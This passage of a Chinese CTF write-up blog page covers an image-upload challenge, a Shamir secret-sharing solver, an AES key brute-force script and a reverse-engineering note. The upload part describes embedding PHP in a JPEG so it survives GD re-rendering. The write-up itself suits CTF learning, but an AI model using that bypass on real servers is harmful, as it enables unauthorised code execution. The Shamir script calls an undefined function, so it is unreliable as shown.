+<h3 id="UPLOAD-IMG"><a href="#UPLOAD-IMG" class="headerlink" title="UPLOAD_IMG"></a>UPLOAD_IMG</h3><p>看样子是个上传题目，只能上传图片，但是发现上传上去有两个问题<br>第一个，如果图片内没有phpinfo()就会提示：<br><img src="30.png" alt="图片">第二个，如果存在了phpinfo()就会提示报500错误<br>果断我们从第一个问题下手，发现他在提示了错误以后会显示我们的图片，这时候保存一下这张图片用hxd打开看看里面的数据<br><img src="31.png" alt="图片"></p>
+<p>发现了这里存在一个gd-jpeg的php的库，说明我们的图片被渲染了，可以知道这个是个二次渲染的题目。经过找了一系列资料以后，从这里看的还比较靠谱：<br><a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a><br>因为比较懒，不想去跑脚本，直接使用了文章当中的素材，但是最后还需要修改一下上传渲染图片里面的phpinfo()的f被变成了6E，改成66就成功了。<br>最后成功上传拿到flag：<br><img src="32.png" alt="图片"></p>
+<hr>
+<h3 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h3><p>p =<br>C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4<br>E32D331535F08FC6338748C8447E72763A07F8AF7<br>组织1成员1 =<br>30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF5000<br>0B74A8B8D572B253E63473A0916B69878A779946A<br>组织1成员2 =<br>1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3<br>C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7<br>组织1成员4 =<br>1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF654<br>6BD09720D5D5F3E7BC1A401C8BD7300C253927BBC<br>组织2成员3 =<br>300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E<br>77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA<br>组织2成员4 =<br>1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022<br>957B0C0584199F02790AAC61D7132F7DB6A8F77B9<br>组织2成员5 =<br>9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67C<br>A8F3CC3BC157E5853E29537E8B9A55C0CF927FE45<br>定义在有限域size=P上的一个shamir算法，直接复制了wiki的代码跑就行了..<br>每个组织的key可以combine出一次明文作为新的key，最再combine一次就得到了int(flag)<br><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing">https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import functools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 12th Mersenne Prime</span><br><span class="line"># (for this application we want a known prime number as close as</span><br><span class="line"># possible to our security level; e.g.  desired security level of 128</span><br><span class="line"># bits -- too large and all the ciphertext is large; too small and</span><br><span class="line"># security is compromised)</span><br><span class="line">#_PRIME&#x3D;2**128-1</span><br><span class="line">_PRIME &#x3D; 0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span><br><span class="line"># 13th Mersenne Prime is 2**521 - 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_RINT &#x3D; functools.partial(random.SystemRandom().randint, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _eval_at(poly, x, prime):</span><br><span class="line">    &#39;&#39;&#39;evaluates polynomial (coefficient tuple) at x, used to generate a</span><br><span class="line">    shamir pool in make_random_shares below.</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    accum &#x3D; 0</span><br><span class="line">    for coeff in reversed(poly):</span><br><span class="line">        accum *&#x3D; x</span><br><span class="line">        accum +&#x3D; coeff</span><br><span class="line">        accum %&#x3D; prime</span><br><span class="line">    return accum</span><br><span class="line"></span><br><span class="line">def _extended_gcd(a, b):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    division in integers modulus p means finding the inverse of the</span><br><span class="line">    denominator modulo p and then multiplying the numerator by this</span><br><span class="line">    inverse (Note: inverse of A is B such that A*B % p &#x3D;&#x3D; 1) this can</span><br><span class="line">    be computed via extended Euclidean algorithm</span><br><span class="line">    http:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Modular_multiplicative_inverse#Computation</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    x &#x3D; 0</span><br><span class="line">    last_x &#x3D; 1</span><br><span class="line">    y &#x3D; 1</span><br><span class="line">    last_y &#x3D; 0</span><br><span class="line">    while b !&#x3D; 0:</span><br><span class="line">        quot &#x3D; a &#x2F;&#x2F; b</span><br><span class="line">        a, b &#x3D; b, a%b</span><br><span class="line">        x, last_x &#x3D; last_x - quot * x, x</span><br><span class="line">        y, last_y &#x3D; last_y - quot * y, y</span><br><span class="line">    return last_x, last_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _divmod(num, den, p):</span><br><span class="line">    &#39;&#39;&#39;compute num &#x2F; den modulo prime p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    To explain what this means, the return value will be such that</span><br><span class="line">    the following is true: den * _divmod(num, den, p) % p &#x3D;&#x3D; num</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    inv, _ &#x3D; _extended_gcd(den, p)</span><br><span class="line">    return num * inv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _lagrange_interpolate(x, x_s, y_s, p):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Find the y-value for the given x, given n (x, y) points;</span><br><span class="line">    k points will define a polynomial of up to kth order</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    k &#x3D; len(x_s)</span><br><span class="line">    assert k &#x3D;&#x3D; len(set(x_s)), &quot;points must be distinct&quot;</span><br><span class="line">    def PI(vals):  # upper-case PI -- product of inputs</span><br><span class="line">        accum &#x3D; 1</span><br><span class="line">        for v in vals:</span><br><span class="line">            accum *&#x3D; v</span><br><span class="line">        return accum</span><br><span class="line">    nums &#x3D; []  # avoid inexact division</span><br><span class="line">    dens &#x3D; []</span><br><span class="line">    for i in range(k):</span><br><span class="line">        others &#x3D; list(x_s)</span><br><span class="line">        cur &#x3D; others.pop(i)</span><br><span class="line">        nums.append(PI(x - o for o in others))</span><br><span class="line">        dens.append(PI(cur - o for o in others))</span><br><span class="line">    den &#x3D; PI(dens)</span><br><span class="line">    num &#x3D; sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)</span><br><span class="line">               for i in range(k)])</span><br><span class="line">    return (_divmod(num, den, p) + p) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recover_secret(shares, prime&#x3D;_PRIME):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Recover the secret from share points</span><br><span class="line">    (x,y points on the polynomial)</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    if len(shares) &lt; 2:</span><br><span class="line">        raise ValueError(&quot;need at least two shares&quot;)</span><br><span class="line">    x_s, y_s &#x3D; zip(*shares)</span><br><span class="line">    return _lagrange_interpolate(0, x_s, y_s, prime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &#39;&#39;&#39;main function&#39;&#39;&#39;</span><br><span class="line">    secret, shares &#x3D; make_random_shares(minimum&#x3D;3, shares&#x3D;6)</span><br><span class="line">    shares1&#x3D;[</span><br><span class="line">    (1,0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A),</span><br><span class="line">    (2,0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7),</span><br><span class="line">    (4,0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC),</span><br><span class="line">]</span><br><span class="line">    #comnbin result&#x3D;shares3[0]</span><br><span class="line">    shares2&#x3D;[</span><br><span class="line">    (3,0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA),</span><br><span class="line">    (4,0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9),</span><br><span class="line">    (5,0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45)</span><br><span class="line">]</span><br><span class="line">    #combin result&#x3D;shares3[1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    shares3&#x3D;[</span><br><span class="line">        (1,4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494),</span><br><span class="line">        (2,8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967)</span><br><span class="line">    ]</span><br><span class="line">    print(&#39;key1:             &#39;,</span><br><span class="line">          recover_secret(shares1))</span><br><span class="line">    print(&#39;key2: &#39;,</span><br><span class="line">          recover_secret(shares2))</span><br><span class="line">    print(&#39;key3&#39;,hex(recover_secret(shares3)))</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="地铁图片"><a href="#地铁图片" class="headerlink" title="地铁图片"></a>地铁图片</h3><p>根据题目的意思可以得出一个lsb的隐写：<br><img src="33.png" alt="图片"><br>可以看出密文：iKk/Ju3vu4wOnssdIaUSrg==<br>根据提示属于AES加密，但是秘钥需要爆破，不足的位数用\0补齐。但是AES秘钥是16的倍数。<br>根据题目的提示3，将所有的地铁路线都弄成小写字母做成一个字典跑一下。最后就可以得出结果。<br>字典太大就不传了，上传一下脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">采用AES对称加密算法</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"># str不是16的倍数那就补足为16的倍数</span><br><span class="line">m &#x3D; &quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">def add_to_16(value):</span><br><span class="line">    while len(value) % 16 !&#x3D; 0:</span><br><span class="line">        value +&#x3D; &#39;\0&#39;</span><br><span class="line">    return str.encode(value)  # 返回bytes</span><br><span class="line">#加密方法</span><br><span class="line">def encrypt_oracle():</span><br><span class="line">    # 秘钥</span><br><span class="line">    key &#x3D; &#39;haiman12&#39;</span><br><span class="line">    # 待加密文本</span><br><span class="line">    text &#x3D; &#39;Hello,GhostFire&#39;</span><br><span class="line">    # 初始化加密器</span><br><span class="line">    aes &#x3D; AES.new(add_to_16(key), AES.MODE_ECB)</span><br><span class="line">    #先进行aes加密</span><br><span class="line">    encrypt_aes &#x3D; aes.encrypt(add_to_16(text))</span><br><span class="line">    #用base64转成字符串形式</span><br><span class="line">    encrypted_text &#x3D; str(base64.encodebytes(encrypt_aes), encoding&#x3D;&#39;utf-8&#39;)  # 执行加密并转码返回bytes</span><br><span class="line">    print(encrypted_text)</span><br><span class="line">#解密方法</span><br><span class="line">def decrypt_oralce():</span><br><span class="line">    f &#x3D; open(&quot;F:&#x2F;Desktop&#x2F;1.txt&quot;,&quot;r&quot;)</span><br><span class="line">    s &#x3D; f.read().split(&quot;\n&quot;)</span><br><span class="line">    b &#x3D; len(s)</span><br><span class="line">    for i in range(0,b):</span><br><span class="line">        key &#x3D; s[i]</span><br><span class="line">        text &#x3D; &#39;iKk&#x2F;Ju3vu4wOnssdIaUSrg&#x3D;&#x3D;&#39;</span><br><span class="line">        # 初始化加密器</span><br><span class="line">        try:</span><br><span class="line">            aes &#x3D; AES.new(add_to_16(key), AES.MODE_ECB)</span><br><span class="line">            #优先逆向解密base64成bytes</span><br><span class="line">            base64_decrypted &#x3D; base64.decodebytes(text.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">            #执行解密密并转码返回str</span><br><span class="line">            decrypted_text &#x3D; str(aes.decrypt(base64_decrypted),encoding&#x3D;&#39;utf-8&#39;).replace(&#39;\0&#39;,&#39;&#39;)</span><br><span class="line">            print(decrypted_text)</span><br><span class="line">            break</span><br><span class="line">        except:</span><br><span class="line">            print(&quot;解密失败&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">   decrypt_oralce()</span><br></pre></td></tr></table></figure>
+<p>跑出来的结果<br>flag:DDCTF{CD*Q23&amp;0}</p>
+<hr>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="obfuscating-macros"><a href="#obfuscating-macros" class="headerlink" title="obfuscating macros"></a>obfuscating macros</h3><p>先看main函数：<br><img src="38.png" alt="图片"><br>存在两个函数分层进行判断<br>第一个函数:sub_406906:<br>通过调试下内存断点可以知道，这个函数对我输入的值进行了16进制转换并且检查了16进制的大小写。<br>比如输入：1234 -&gt; \x12\x34      1E5E -&gt;\x1E\x5E</p>
+<p><img src="39.png" alt="图片"></p>
+<p>然后就是第二个sub_4013E6：<br>主要就需要看这个部分就可以了<br><img src="40.png" alt="图片"><br>前面设置了v24为上面函数处理过的HEX的值，然后通过v4与v26进行相减，只要v4的结果为0那么就是最小了，所以只需要关注v26的值就好了。<br>对v26的值进行监视发现最后的结果就是flag了。</p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            G0fl1er
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>一只想学技术的专科菜鸡</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964746176926/">MSSQL学习笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964746176908/">14道杂项中的隐写题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964745856182/"></a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/16/MSSQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">MSSQL学习笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/16/filename/">14道杂项中的隐写题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/11/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7Angr%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">符号执行工具Angr的简单使用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/11/docs/15964746176721/">符号执行工具Angr的简单使用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/">2019DDCTF部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/04/25/docs/15964746176699/">2019DDCTF部分wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/11/mysql%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/">mysql手动注入</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/16/MSSQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">MSSQL学习笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/31/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/">C语言学习第二天</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/15/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/">c语言学习第一天</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/11/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7Angr%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">符号执行工具Angr的简单使用</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/19/docs/15964746176674/">2018湖湘杯复赛部分题解</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/13/docs/15964746176784/">一道picoctf的RSA题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/31/docs/15964746176850/">C语言学习第二天</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/08/docs/15964746176890/">CVE-2018-4407复现(ios缓冲区溢出漏洞)</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964746176908/">14道杂项中的隐写题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/17/docs/15964746176806/">我校平台CTF解题部分wp</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                <li class="">
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                <li class="">
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                <li class="">
+                    <a href="/2019/04/25/2019DDCTF%E9%83%A8%E5%88%86wp/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/ctf/" style="font-size: 12.54708328926794px;" class="tag-cloud-link">ctf</a>
+    
+    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10.353017400254448px;" class="tag-cloud-link">漏洞复现</a>
+    
+    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 19.240659816177903px;" class="tag-cloud-link">学习笔记</a>
+    
+</div>
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="youlian/index.html" target="_blank">大佬友链</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="" target="_blank">Github</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 G0fl1er Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
